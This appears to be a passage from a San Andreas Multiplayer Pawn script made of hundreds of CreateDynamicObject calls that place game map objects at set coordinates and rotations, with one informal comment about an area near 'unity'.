	CreateDynamicObject(3406,3281.6630900,-1877.2002000,-0.5750000,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(19377,3319.1374500,-1767.5825200,11.8082000,0.0000000,90.0000000,72.0000000); //
	CreateDynamicObject(19377,3315.9272500,-1777.5413800,11.8082000,0.0000000,90.0000000,72.0000000); //
	CreateDynamicObject(19377,3312.5078100,-1787.4161400,11.8082000,0.0000000,90.0000000,72.0000000); //
	CreateDynamicObject(19377,3310.8327600,-1792.8649900,11.8082000,0.0000000,90.0000000,72.0000000); //
	CreateDynamicObject(19377,3355.3962400,-1779.3076200,11.8082000,0.0000000,90.0000000,72.0000000); //
	CreateDynamicObject(19377,3347.3935500,-1804.7613500,11.8082000,0.0000000,90.0000000,72.0000000); //
	CreateDynamicObject(6189,3424.8164100,-1462.5667700,-3.7057000,0.0000000,0.0000000,162.0000000); //
	CreateDynamicObject(14846,263.8000000,13.9000000,1009.3000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(16151,1992.2000000,1003.7000000,993.7600000,0.0000000,0.0000000,270.0000000); //
	CreateDynamicObject(2755,1995.4000000,1010.6000000,995.2000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,1992.7000000,1010.6000000,995.2000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,1990.2000000,1010.6000000,995.2000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,1987.7000000,1010.6000000,995.2000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,1985.2000000,1010.6000000,995.2000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,2003.9000000,1004.2000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,2003.9000000,1006.6000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,2003.9000000,1009.1000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,1982.5000000,1008.5000000,994.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,1982.5000000,1010.6000000,994.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3434,1990.3000000,1017.8000000,1008.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(14782,2000.2000000,1003.3000000,994.4000000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(3437,1982.7000000,1006.1000000,999.3000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,1996.7000000,1004.4000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,1996.7000000,1006.9000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,1996.7000000,1009.3000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,1983.9000000,1006.9000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,1983.9000000,1004.3000000,995.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9833,1994.3000000,1017.8000000,996.7000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3461,1996.9000000,1011.1000000,995.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3461,2003.9000000,1011.1000000,995.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3461,1981.2000000,1010.7000000,995.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3461,1981.2000000,1008.4000000,995.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2799,1986.6000000,1004.5000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(2799,1994.7000000,1008.9000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(2799,1993.8000000,1007.3000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(2799,1991.3000000,1009.2000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(2799,1990.7000000,1007.5000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(2799,1988.8000000,1009.3000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(2799,1989.2000000,1006.8000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(2799,1987.2000000,1006.4000000,994.0000000,0.0000000,0.0000000,260.0000000); //
	CreateDynamicObject(10010,1963.8000000,924.0000000,991.4000000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(4084,1999.6000000,890.7000000,993.6000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(4084,1993.7000000,890.7000000,993.6000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(4084,1999.6000000,890.7000000,997.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(4084,1994.0000000,890.7000000,997.2000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(980,3304.6860400,-1777.2475600,14.4326000,0.0000000,0.0000000,72.2500000); //
	CreateDynamicObject(980,2906.7895500,-1649.3201900,14.4268000,0.0000000,0.0000000,72.5000000); //


    //the empty area next to unity and some random shiz
 	CreateDynamicObject(18766, 1634.67, -1672.44, 14.86,   0.00, 0.00, -90.10);
	CreateDynamicObject(18766, 1639.23, -1667.01, 14.79,   0.00, 0.00, 0.00);
	CreateDynamicObject(18766, 1639.30, -1677.94, 14.66,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, 1642.68, -1688.63, 11.86,   0.00, 0.00, -142.80);
	CreateDynamicObject(987, 1633.11, -1695.73, 11.87,   0.00, 0.00, -113.20);
	CreateDynamicObject(987, 1628.37, -1706.55, 10.71,   0.00, 0.00, -17.00);
	CreateDynamicObject(9833, 1658.66, -1689.80, 23.73,   0.00, 0.00, 33.90);
	CreateDynamicObject(987, 1679.14, -1676.03, 18.89,   0.00, 0.00, 85.80);
	CreateDynamicObject(987, 1679.12, -1682.00, 18.87,   0.00, 0.00, 88.00);
	CreateDynamicObject(6159, 1780.77, -1750.52, 19.73,   0.00, 0.00, 0.00);
	CreateDynamicObject(6907, 1801.99, -1798.13, 12.52,   0.00, 0.00, 90.70);
	CreateDynamicObject(1497, 1778.25, -1747.74, 20.33,   0.00, 0.00, -88.20);
	CreateDynamicObject(1497, 1778.34, -1750.75, 20.34,   0.00, 0.00, 91.00);
	CreateDynamicObject(19419, 1082.99, -1226.51, 18.25,   83.70, -24.80, 119.40);
	CreateDynamicObject(1555, 2787.43, -1918.86, 16.27,   0.00, 0.00, 88.90);
	CreateDynamicObject(1555, 2787.74, -1928.08, 16.31,   0.00, 0.00, 89.90);
	CreateDynamicObject(1254, 1825.13, -3000.05, 11.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(16500, 2441.43, -1543.95, 23.31,   0.00, 0.00, 0.00);
	CreateDynamicObject(16500, 2472.43, -1514.47, 24.09,   0.00, 0.00, 89.10);
	CreateDynamicObject(18766, 1634.74, -1672.44, 18.36,   0.00, 0.00, -89.80);
	CreateDynamicObject(18766, 1639.33, -1667.25, 17.89,   0.00, 0.00, 0.00);
	CreateDynamicObject(18766, 1639.38, -1677.95, 17.89,   0.00, 0.00, 0.00);
	CreateDynamicObject(18889, 1731.35, -3376.29, 81.85,   0.00, 0.00, -28.90);
	CreateDynamicObject(18888, 1727.97, -3383.66, 80.34,   0.00, 0.00, 0.00);
	CreateDynamicObject(1533, 2268.20, -1701.45, 12.63,   0.00, 0.00, 0.00);
	CreateDynamicObject(3109, 2787.71, -1955.43, 17.55,   0.00, 0.00, 0.00);
	CreateDynamicObject(2332, 2787.10, -1911.39, 12.98,   0.00, 0.00, 2.30);
	CreateDynamicObject(13011, 2791.87, -1945.01, 17.80,   0.00, 0.00, 0.00);
	CreateDynamicObject(1597, 1747.18, -1740.63, 15.14,   0.00, 0.00, -90.30);
	CreateDynamicObject(1597, 1733.83, -1741.66, 15.16,   0.00, 0.00, -90.30);
	CreateDynamicObject(16151, 1777.37, -1754.81, 20.66,   0.00, 0.00, 0.00);
	CreateDynamicObject(18998, 801.19, -3702.10, 25.80,   0.00, -91.90, 0.00);
	CreateDynamicObject(18999, 605.75, -3699.74, 41.20,   -6.90, -79.00, 0.00);
	CreateDynamicObject(6959, 486.56, -3693.17, 55.22,   0.00, 0.00, 0.00);
	CreateDynamicObject(18656, 528.91, -3723.30, 56.65,   0.00, 0.00, 0.00);
	CreateDynamicObject(18656, 541.31, -3724.85, 56.65,   0.00, 0.00, 0.00);
	CreateDynamicObject(18656, 518.74, -3720.94, 56.65,   0.00, 0.00, 0.00);
	CreateDynamicObject(3660, 1813.59, -2057.64, 14.68,   0.00, 0.00, 90.30);
	CreateDynamicObject(3660, 1813.76, -2087.30, 14.58,   0.00, 0.00, 90.30);
	CreateDynamicObject(11468, 386.42, -3703.12, 54.06,   0.00, 0.00, -33.00);
	CreateDynamicObject(12837, 155.26, -3722.97, 46.12,   0.00, 0.00, 90.60);
	CreateDynamicObject(987, 2180.61, -1148.41, 1028.63,   0.00, 0.00, 0.00);
	CreateDynamicObject(1256, 2068.73, -1776.57, 13.18,   0.00, 0.00, -179.40);
	CreateDynamicObject(11313, 3271.19, -318.09, 5.12,   0.00, 0.00, -80.00);
	CreateDynamicObject(19325, 1775.36, -1742.99, 14.34,   0.00, 0.00, -91.20);
	CreateDynamicObject(19325, 1768.76, -1743.01, 14.36,   0.00, 0.00, -89.80);
	CreateDynamicObject(1569, 1771.51, -1742.96, 12.51,   0.00, 0.00, -1.40);
	CreateDynamicObject(19447, 1769.38, -1902.39, 13.87,   0.00, 0.00, 0.00);
	CreateDynamicObject(19447, 1769.40, -1887.78, 13.88,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, 1769.52, -1892.11, 13.19,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, 1769.50, -1897.02, 13.19,   0.00, 0.00, 0.00);
	CreateDynamicObject(1365, 1838.99, -1887.70, 13.46,   0.00, 0.00, 0.00);
	CreateDynamicObject(1441, 1834.77, -1888.62, 13.05,   0.00, 0.00, -175.80);
	CreateDynamicObject(13591, 1863.87, -1871.91, 12.94,   0.00, 0.00, -89.60);
	CreateDynamicObject(19377, 1773.03, -1747.95, 25.19,   0.40, 90.10, 0.40);
	CreateDynamicObject(987, 1280.77, 4.14, 998.85,   0.00, 0.00, 89.90);
	CreateDynamicObject(19377, 1773.31, -1753.57, 25.16,   0.40, 90.10, 0.40);
	CreateDynamicObject(19377, 1763.15, -1752.89, 25.17,   0.40, 90.10, 0.40);
	CreateDynamicObject(2188, 1764.18, -1749.90, 21.23,   0.00, 0.00, 0.20);
	CreateDynamicObject(1723, 1751.40, -1746.73, 20.27,   0.00, -0.20, 87.90);
	CreateDynamicObject(2188, 1764.21, -1749.95, 21.22,   0.60, 0.00, 178.80);
	CreateDynamicObject(1723, 1752.35, -1743.84, 20.30,   0.00, 0.00, 0.00);
	CreateDynamicObject(19377, 1763.12, -1748.01, 25.21,   0.40, 90.10, 0.40);
	CreateDynamicObject(19377, 1756.08, -1752.94, 25.19,   0.40, 90.10, 0.40);
	CreateDynamicObject(19377, 1756.05, -1748.06, 25.22,   0.40, 90.10, 0.40);
	CreateDynamicObject(1501, -1849.97, 811.84, 112.55,   0.00, 0.00, 0.00);
	CreateDynamicObject(736, 1579.83, -1761.03, 23.23,   0.00, 0.00, 0.00);
	CreateDynamicObject(736, 1580.06, -1747.55, 23.48,   0.00, 0.00, 0.00);
	CreateDynamicObject(19325, 1758.80, -1758.46, 22.49,   0.00, 0.00, -89.90);
	CreateDynamicObject(19325, 1765.41, -1758.44, 22.91,   0.00, 0.00, -89.80);
	CreateDynamicObject(19325, 1771.89, -1758.43, 22.15,   0.00, 0.00, -90.00);
	CreateDynamicObject(19325, 1778.40, -1758.49, 22.17,   0.00, 0.00, -90.90);
	CreateDynamicObject(18762, 1751.43, -1758.68, 22.14,   0.00, 0.00, 0.00);
	CreateDynamicObject(2208, 1762.07, -1745.54, 20.33,   0.00, 0.00, 0.00);
	CreateDynamicObject(2068, 1777.30, -1753.95, 24.64,   0.00, 0.00, 0.00);
	CreateDynamicObject(973, 2822.47, -1069.52, 29.78,   0.00, 0.00, -45.10);
	CreateDynamicObject(987, -1436.89, 772.34, 45.77,   0.00, 0.00, -43.60);
	CreateDynamicObject(987, -1445.36, 780.72, 45.81,   0.00, 0.00, -43.70);
	CreateDynamicObject(18647, 2021.79, -1410.90, 22.06,   0.00, 0.00, 88.50);
	CreateDynamicObject(19325, 1760.82, -1742.53, 22.19,   0.00, 0.00, 89.90);
	CreateDynamicObject(987, -1152.06, 1071.30, 38.76,   0.00, 0.00, -40.10);
	CreateDynamicObject(987, -1160.94, 1079.15, 38.65,   0.00, 0.00, -40.80);
	CreateDynamicObject(987, -1168.24, 1088.15, 39.03,   0.00, 0.00, -50.50);
	CreateDynamicObject(987, -1173.33, 1095.96, 38.95,   0.00, 0.00, -55.80);
	CreateDynamicObject(969, 1386.46, 12.77, 1002.71,   0.00, 0.00, -89.30);
	CreateDynamicObject(19325, 1767.42, -1742.53, 22.27,   0.00, 0.00, 90.10);
	CreateDynamicObject(19325, 1774.04, -1742.53, 22.17,   0.00, 0.00, 89.60);
	CreateDynamicObject(19325, 1779.87, -1744.78, 22.46,   0.00, 0.00, 49.00);
	CreateDynamicObject(18652, 2023.84, -1410.83, 22.06,   0.00, 0.00, 88.10);
	CreateDynamicObject(18647, 2025.95, -1410.86, 22.06,   0.00, 0.00, 91.60);
	CreateDynamicObject(18652, 2028.47, -1410.91, 22.09,   0.00, 0.00, 91.00);
	CreateDynamicObject(988, 681.22, -449.76, -26.89,   -87.30, -0.40, -0.90);
	CreateDynamicObject(18647, 2030.92, -1410.82, 22.04,   0.00, 0.00, 88.10);
	CreateDynamicObject(18652, 2033.40, -1410.85, 22.01,   0.00, 0.00, 88.60);
	CreateDynamicObject(18647, 2035.92, -1410.93, 22.03,   0.00, 0.00, 87.90);
	CreateDynamicObject(18652, 2038.27, -1410.85, 21.99,   0.00, 0.00, 88.60);
	CreateDynamicObject(18647, 2040.51, -1410.81, 22.04,   0.00, 0.00, 90.80);
	CreateDynamicObject(18652, 2043.08, -1410.76, 22.11,   0.00, 0.00, 90.60);
	CreateDynamicObject(1896, 1768.88, -1749.31, 21.34,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2027.85, -1425.01, 16.27,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2006.22, -1439.50, 12.99,   0.00, 0.00, -154.70);
	CreateDynamicObject(1215, 2008.39, -1441.66, 12.80,   0.00, 0.00, 0.00);
	CreateDynamicObject(19325, -686.71, 931.76, 12.77,   0.00, 0.00, -90.10);
	CreateDynamicObject(19392, -691.33, 931.80, 13.99,   0.00, 0.00, -90.00);
	CreateDynamicObject(18689, 1260.50, -785.85, 1091.74,   0.00, 0.00, 0.00);
	CreateDynamicObject(3430, 1777.97, -1745.52, 21.51,   0.00, 0.00, 46.70);
	CreateDynamicObject(1978, 1758.67, -1749.87, 21.33,   0.00, 0.00, 91.10);
	CreateDynamicObject(1836, 1772.38, -1742.84, 21.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1836, 1769.22, -1742.81, 21.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(987, -2011.13, -114.73, 40.39,   0.00, 0.00, 90.00);
	CreateDynamicObject(2690, 1778.18, -1751.21, 21.66,   0.00, 0.00, 0.00);
	CreateDynamicObject(2690, 1778.18, -1751.50, 21.66,   0.00, 0.00, 0.00);
	CreateDynamicObject(632, 1752.31, -1743.87, 20.81,   0.00, 0.00, 0.00);
	CreateDynamicObject(2035, 1778.06, -1757.03, 20.86,   0.70, -78.70, -1.00);
	CreateDynamicObject(2034, 1776.51, -1758.02, 21.31,   -2.40, 1.20, -82.00);
	CreateDynamicObject(1550, 1777.99, -1756.62, 20.70,   0.00, 0.00, 0.00);
	CreateDynamicObject(1957, 1763.66, -1745.46, 21.29,   0.00, 0.00, 0.00);
	CreateDynamicObject(1840, 1762.99, -1745.52, 21.18,   0.00, 0.00, 89.40);
	CreateDynamicObject(1783, 1762.29, -1745.45, 21.29,   0.00, 0.00, 0.00);
	CreateDynamicObject(1569, 1774.51, -1742.99, 12.52,   0.00, 0.00, 179.10);
	CreateDynamicObject(1896, 1769.04, -1750.15, 21.34,   0.00, 0.00, 179.80);
	CreateDynamicObject(19302, 1968.91, -1270.60, 23.82,   0.00, 0.00, 0.00);
	CreateDynamicObject(2785, 1751.38, -1754.65, 21.13,   0.10, -0.20, 90.10);
	CreateDynamicObject(1886, 1751.26, -1743.90, 25.20,   24.00, 0.00, 33.50);
	CreateDynamicObject(1886, 1777.80, -1749.19, 24.98,   35.30, 1.00, -89.40);
	CreateDynamicObject(18764, 1772.78, -1745.44, 12.88,   0.00, 0.00, -0.80);
	CreateDynamicObject(3437, 1776.72, -1742.79, 14.98,   0.00, 0.00, 0.00);
	CreateDynamicObject(3437, 1768.95, -1742.79, 14.73,   0.00, 0.00, 0.00);
	CreateDynamicObject(3437, 1789.48, -1743.02, 14.81,   0.00, 0.00, 0.00);
	CreateDynamicObject(3437, 1781.47, -1743.05, 14.57,   0.00, 0.00, 0.00);
	CreateDynamicObject(19325, 1782.55, -1743.07, 14.48,   0.00, 0.00, -89.80);
	CreateDynamicObject(19325, 1787.76, -1743.07, 14.46,   0.00, 0.00, -90.00);
	CreateDynamicObject(18764, 1785.44, -1745.52, 13.55,   0.00, 0.00, 0.00);
	CreateDynamicObject(1569, 1783.98, -1743.07, 12.55,   0.00, 0.00, 0.00);
	CreateDynamicObject(1569, 1786.99, -1743.01, 12.54,   0.00, 0.00, -178.80);
	CreateDynamicObject(19325, 1800.25, -1743.06, 14.60,   0.00, 0.00, -90.40);
	CreateDynamicObject(19325, 1793.92, -1743.07, 14.56,   0.00, 0.00, -89.50);
	CreateDynamicObject(18764, 1798.01, -1745.46, 12.92,   0.00, 0.00, 0.00);
	CreateDynamicObject(3437, 1801.98, -1743.04, 14.48,   0.00, 0.00, 0.00);
	CreateDynamicObject(3437, 1793.85, -1743.06, 15.12,   0.00, 0.00, 0.00);
	CreateDynamicObject(1569, 1796.77, -1743.00, 12.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1569, 1799.73, -1742.98, 12.53,   0.00, 0.00, -179.70);
	CreateDynamicObject(19325, 1754.20, -1742.53, 22.19,   0.00, 0.00, 89.90);
	CreateDynamicObject(18762, 1752.40, -1758.68, 22.14,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, 1755.12, -1758.68, 22.14,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, 1754.83, -1758.68, 22.14,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, 1753.04, -1758.68, 23.91,   0.00, -90.00, 0.00);
	CreateDynamicObject(6976, 1771.10, -1760.74, 12.18,   0.00, 0.00, 180.91);
	CreateDynamicObject(10841, 2305.20, -2208.60, 9.20,   0.00, 0.00, 41.30);
	CreateDynamicObject(10841, 2320.60, -2194.40, 8.60,   -44.60, 1.60, 60.50);
	CreateDynamicObject(18762, 2313.80, -2201.00, 7.10,   0.00, 0.00, -49.00);
	CreateDynamicObject(18762, 2316.90, -2205.50, 6.40,   -1.70, -43.20, -29.40);
	CreateDynamicObject(18762, 2314.90, -2204.20, 8.90,   0.00, -44.60, -32.90);
	CreateDynamicObject(19486, 1801.10, -2035.70, 14.90,   0.00, 0.00, 89.50);
	CreateDynamicObject(18084, 1792.20, -2028.00, 13.90,   0.00, 0.00, 89.30);
	CreateDynamicObject(18084, 1792.20, -2034.40, 13.80,   0.00, 0.00, 89.00);
	CreateDynamicObject(18084, 1792.20, -2040.90, 13.80,   0.00, 0.00, 89.50);
	CreateDynamicObject(18084, 1792.30, -2021.20, 13.80,   0.00, 0.00, 89.70);
	CreateDynamicObject(18084, 1810.20, -2040.80, 13.90,   0.00, 0.00, -91.00);
	CreateDynamicObject(19450, 1799.60, -2026.70, 14.20,   0.00, 0.00, -1.00);
	CreateDynamicObject(19450, 1799.40, -2037.70, 14.20,   0.00, 0.00, -1.30);
	CreateDynamicObject(19379, 1798.00, -2027.00, 12.40,   0.30, -89.80, -89.80);
	CreateDynamicObject(19462, 1798.00, -2021.30, 12.40,   0.20, -90.10, -95.00);
	CreateDynamicObject(19450, 1802.80, -2037.60, 14.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(19450, 1802.80, -2031.90, 14.10,   0.00, 0.00, -0.30);
	CreateDynamicObject(19379, 1797.90, -2037.20, 12.40,   0.00, -90.00, -90.80);
	CreateDynamicObject(929, 1807.50, -2023.20, 13.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(929, 1805.10, -2023.40, 13.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(1364, 1807.00, -1817.10, 13.10,   -1.70, 0.20, 89.30);
	CreateDynamicObject(1723, 1794.80, -2037.30, 12.40,   0.00, 0.00, 88.60);
	CreateDynamicObject(16151, 1794.50, -2024.80, 12.80,   0.00, 0.00, 179.60);
	CreateDynamicObject(628, 1798.20, -2021.20, 14.40,   0.00, 0.00, 0.00);
	CreateDynamicObject(18001, 2520.60, -1283.60, 1052.00,   0.50, 90.70, 179.60);
	CreateDynamicObject(1497, 2518.00, -1285.60, 1053.50,   0.00, 0.00, -89.90);
	CreateDynamicObject(18001, 2522.00, -1283.60, 1052.10,   0.50, 90.80, -179.20);
	CreateDynamicObject(18001, 2520.50, -1283.60, 1052.00,   0.50, 90.80, 0.40);
	CreateDynamicObject(18001, 2521.90, -1283.60, 1052.00,   0.50, 90.80, 0.40);
	CreateDynamicObject(1361, 1807.00, -1814.50, 12.70,   0.00, 0.00, 0.00);
	CreateDynamicObject(1361, 1807.00, -1819.70, 12.70,   0.00, 0.00, 0.00);
	CreateDynamicObject(1597, 1810.40, -1817.30, 15.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(677, 1803.00, -1819.00, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(801, 1804.10, -1816.80, 12.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(18552, 1734.50, -1791.70, 12.40,   0.00, 0.00, 90.30);
	CreateDynamicObject(1522, 1753.90, -1786.90, 12.50,   0.00, 0.00, 87.20);
	CreateDynamicObject(955, 1759.00, -1759.60, 12.80,   0.00, 0.00, 0.00);
	CreateDynamicObject(1679, 1749.60, -1775.30, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1679, 1753.00, -1761.30, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1679, 1793.00, -1769.40, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(955, 1802.50, -1770.30, 12.80,   0.00, 0.00, -178.90);
	CreateDynamicObject(3660, 1801.50, -1764.70, 14.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(3660, 1778.60, -1764.70, 14.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(3660, 1756.60, -1764.70, 14.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(1569, 1742.10, -1794.60, 12.40,   0.00, 0.00, 89.90);
	CreateDynamicObject(1215, 1737.70, -1782.40, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1742.30, -1800.80, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(638, 1739.20, -1768.90, 13.10,   0.00, 0.00, 91.90);
	CreateDynamicObject(1280, 1739.10, -1769.70, 12.80,   0.00, 0.00, 91.70);
	CreateDynamicObject(1280, 1739.10, -1768.10, 12.80,   0.00, 0.00, -88.10);
	CreateDynamicObject(1215, 1742.30, -1782.40, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1730.60, -1801.00, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1699.90, -1801.70, 16.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1736.20, -1806.20, 16.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1728.50, -1804.10, 16.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1722.70, -1802.50, 16.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1717.80, -1801.70, 16.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1712.70, -1801.70, 16.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1707.40, -1801.70, 16.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1231, 1810.40, -1764.70, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1747.10, -1765.00, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1752.10, -1765.10, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1757.40, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1763.80, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1769.50, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1774.00, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1779.10, -1765.00, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1784.00, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1787.80, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1792.60, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1796.90, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1800.10, -1765.00, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1231, 1803.90, -1764.90, 13.70,   0.00, 0.00, -92.60);
	CreateDynamicObject(1571, 1789.70, -1769.20, 13.80,   0.00, 0.00, 179.30);
	CreateDynamicObject(1679, 1749.80, -1794.30, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1679, 1749.60, -1779.00, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1679, 1749.60, -1782.70, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1679, 1749.80, -1790.20, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1738.90, -1758.90, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1747.90, -1758.90, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1745.80, -1758.90, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1744.00, -1758.90, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1742.20, -1758.90, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1740.60, -1758.90, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1751.10, -1800.80, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1346, 1790.00, -1758.60, 13.80,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1745.70, -1800.80, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1346, 1788.10, -1758.60, 13.80,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1748.80, -1800.90, 13.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(1257, 1830.60, -1729.40, 13.70,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1810.40, -1759.40, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1810.40, -1766.20, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1810.40, -1768.10, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1810.40, -1761.40, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1810.40, -1769.90, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 1810.40, -1763.60, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(1257, 1813.00, -1774.40, 13.70,   0.00, 0.00, 179.00);
	CreateDynamicObject(1291, 1815.70, -1779.30, 12.90,   0.00, 0.00, -91.70);
	CreateDynamicObject(1415, 1727.60, -1795.70, 12.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(1358, 1723.60, -1796.60, 13.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1300, 1741.10, -1768.90, 12.80,   0.00, 0.00, 0.00);
	CreateDynamicObject(1300, 1746.30, -1765.00, 12.80,   0.00, 0.00, -90.00);
	CreateDynamicObject(1300, 1811.80, -1765.10, 12.80,   0.00, 0.00, -90.00);
	CreateDynamicObject(1300, 1767.40, -1765.00, 12.80,   0.00, 0.00, -90.00);
	CreateDynamicObject(1300, 1791.10, -1765.00, 12.80,   0.00, 0.00, -90.00);
	CreateDynamicObject(1364, 1783.50, -1770.10, 13.20,   0.00, 0.00, -180.00);
	CreateDynamicObject(1364, 1753.70, -1770.60, 13.20,   0.00, 0.00, -177.40);
	CreateDynamicObject(1364, 1769.30, -1770.30, 13.20,   0.00, 0.00, -180.00);
	CreateDynamicObject(1364, 1775.00, -1758.80, 13.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(1364, 1784.00, -1758.80, 13.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(3515, 1737.60, -1761.90, 12.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(3515, 1737.60, -1775.30, 12.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(1223, 1711.50, -1795.30, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(7911, 1719.60, -1795.10, 23.20,   0.00, 0.00, 0.00);
	CreateDynamicObject(1223, 1727.70, -1795.30, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1223, 1725.80, -1795.30, 21.70,   0.00, 0.00, -93.70);
